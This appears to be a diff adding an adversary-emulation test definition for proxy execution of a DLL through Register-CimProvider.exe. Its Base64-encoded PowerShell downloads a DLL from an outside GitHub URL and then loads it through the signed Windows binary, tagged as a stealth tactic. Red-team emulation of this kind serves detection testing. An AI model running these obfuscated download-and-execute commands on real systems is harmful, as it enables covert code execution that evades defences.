@@ -1,0 +1,18 @@
+- id: 0b426e70-0e98-52cc-91b2-c92c3eead00e
+  name: Soumaia ART Tests - Register-CimProvider - Execute evil dll
+  description: Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB
+  tactic: stealth
+  technique:
+    attack_id: T1218
+    name: Signed Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAyADEAOAAtADIALgBkAGwAbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMgAxADgALQAyAC4AZABsAGwAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAyADEAOAAvAHMAcgBjAC8AVwBpAG4AMwAyAC8AVAAxADIAMQA4AC0AMgAuAGQAbABsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABUADEAMgAxADgALQAyAC4AZABsAGwAIgAKAA==
+          )
+          C:\Windows\SysWow64\Register-CimProvider.exe -Path ".\T1218-2.dll"
+        payloads:
+        - T1218-2.dll
